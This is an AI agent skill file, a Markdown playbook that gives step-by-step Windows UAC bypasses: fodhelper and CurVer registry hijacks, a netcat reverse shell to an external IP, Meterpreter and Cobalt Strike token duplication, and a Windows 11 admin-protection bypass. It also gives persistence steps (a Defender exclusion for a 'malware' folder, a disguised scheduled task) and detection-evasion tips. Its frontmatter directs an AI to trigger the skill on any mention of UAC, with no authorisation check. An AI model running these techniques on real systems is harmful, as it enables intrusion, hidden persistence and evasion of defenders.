---
name: windows-uac-bypass
description: Windows UAC bypass and privilege escalation techniques. Use this skill whenever the user needs to bypass User Account Control on Windows, check UAC status, understand UAC policies, or escalate from medium to high integrity. Trigger on mentions of UAC, elevation, admin approval mode, fodhelper, token duplication, or any Windows privilege escalation scenario where the user is in the Administrators group but needs higher privileges.
---

# Windows UAC Bypass Skill

This skill helps you understand, check, and bypass Windows User Account Control (UAC) when performing security assessments or red team operations.

## When to Use This Skill

Use this skill when:
- You have a medium integrity shell and need high integrity (admin) access
- You're in the Administrators group but UAC is blocking elevation
- You need to check UAC configuration on a target system
- You want to understand UAC bypass techniques for a specific Windows version
- You're planning privilege escalation on Windows systems

## Quick Start

### 1. Check UAC Status First

Before attempting any bypass, determine the current UAC configuration:

```powershell
# Check if UAC is enabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA"

# Check the elevation prompt behavior (0 = disabled, 5 = default)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin"

# Check your current integrity level
$token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$token.Groups | Where-Object { $_.Value -eq "S-1-16-12288" }  # Medium integrity
$token.Groups | Where-Object { $_.Value -eq "S-1-16-12289" }  # High integrity

# Check if you're in Administrators group
net localgroup administrators
```

### 2. Determine Your Situation

| Situation | Recommended Approach |
|-----------|---------------------|
| UAC disabled (`ConsentPromptBehaviorAdmin = 0`) | Use `Start-Process -Verb runAs` |
| UAC enabled, you're in Administrators | Use fodhelper bypass or token duplication |
| You have GUI access | Simply click "Yes" on the prompt |
| Windows 11 25H2+ with Admin Protection | Use drive-letter hijack technique |

## UAC Bypass Techniques

### Technique 1: fodhelper.exe Registry Hijack (Most Reliable)

This is the most widely applicable bypass. The `fodhelper.exe` binary auto-elevates and reads from HKCU without validation.

**Prerequisites:**
- User is in Administrators group
- UAC is enabled (not disabled)
- Windows 8.1 or later

**Steps:**

```powershell
# 1) Create the vulnerable registry key
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set your payload (replace with your actual command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c <YOUR_COMMAND>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"

# 4) Cleanup (important for stealth)
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

**For 32-bit shells on 64-bit Windows:**
```powershell
# Spawn 64-bit PowerShell first for stability
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell -nop -w hidden -c "<YOUR_COMMANDS>"
```

### Technique 2: CurVer Extension Hijack Variant

A newer variant that avoids `DelegateExecute` by redirecting the `ms-settings` ProgID.

```powershell
# Create custom extension handler
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\ProgramData\payload.exe" -Force | Out-Null

# Redirect ms-settings to use our extension
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

# Trigger
Start-Process "C:\Windows\System32\fodhelper.exe"
```

### Technique 3: UAC Disabled - Simple Elevation

If UAC is already disabled, elevation is straightforward:

```powershell
# Execute any command with admin privileges
Start-Process powershell -Verb runAs "-Command <YOUR_COMMAND>"

# Example: reverse shell
Start-Process powershell -Verb runAs "-Command 'C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444'"
```

### Technique 4: Token Duplication

Requires a full interactive shell (Session 1). Works with Meterpreter.

```powershell
# From Meterpreter:
elevate uac-token-duplication [listener_name]

# Or with Cobalt Strike:
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "<COMMAND>"
```

### Technique 5: Windows 11 25H2 Administrator Protection Bypass

For the newest Windows 11 versions with enhanced admin protection:

```powershell
# Requires NtObjectManager module
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices\$auth\C:" "\??\\C:\\Users\\attacker\\loot"
```

## UAC Policy Reference

Key registry values that control UAC behavior:

| Registry Key | Default | Description |
|-------------|---------|-------------|
| `EnableLUA` | 1 | Enable/disable UAC entirely |
| `ConsentPromptBehaviorAdmin` | 5 | Admin elevation prompt behavior |
| `ConsentPromptBehaviorUser` | 1 | Standard user elevation prompt |
| `PromptOnSecureDesktop` | 1 | Use secure desktop for prompts |
| `EnableUIADesktopToggle` | 0 | Allow UIAccess without secure desktop |

**To force credential prompts (hardening):**
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorUser" -Value 1
```

## Post-Bypass Persistence

After successful elevation, you may want to maintain access:

```powershell
# Disable future UAC prompts (stealth)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0

# Add Defender exclusion
Add-MpPreference -ExclusionPath "C:\ProgramData\malware"

# Create scheduled task for persistence
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "<YOUR_PAYLOAD>"
```

## Detection Evasion Tips

1. **Avoid UI prompts** - Use `-WindowStyle Hidden` in PowerShell
2. **Clean up registry keys** - Remove hijacked keys after use
3. **Use legitimate-looking task names** - "OneDrive Startup Task" instead of "malware"
4. **Encode payloads** - Use base64 or XOR encoding
5. **Time your operations** - Avoid running during business hours

## Tools to Know

- **UACME** - Collection of UAC bypass exploits (compile with Visual Studio)
- **Cobalt Strike** - Built-in UAC bypass modules
- **Metasploit** - Various UAC bypass modules
- **KRBUACBypass** - Kerberos-based bypass

## Important Notes

- **UAC is not a security boundary** - It's a convenience feature, not a hard security control
- **Standard users cannot bypass UAC** without a local privilege escalation exploit
- **GUI access makes bypass trivial** - Just click "Yes" on the prompt
- **Some bypasses are noisy** - They may trigger alerts or user-visible prompts
- **Always test in a lab first** - Bypasses may not work on all Windows versions

## Troubleshooting

| Issue | Solution |
|-------|----------|
| fodhelper doesn't elevate | Check if user is in Administrators group |
| Registry key creation fails | You may need to use a different bypass |
| Bypass works but no shell | Ensure your payload is correct and reachable |
| Windows 11 25H2 blocks bypass | Use the drive-letter hijack technique |

## References

- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [UACME - UAC bypass collection](https://github.com/hfiref0x/UACME)
- [Microsoft: How UAC works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [Project Zero: Windows Admin Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
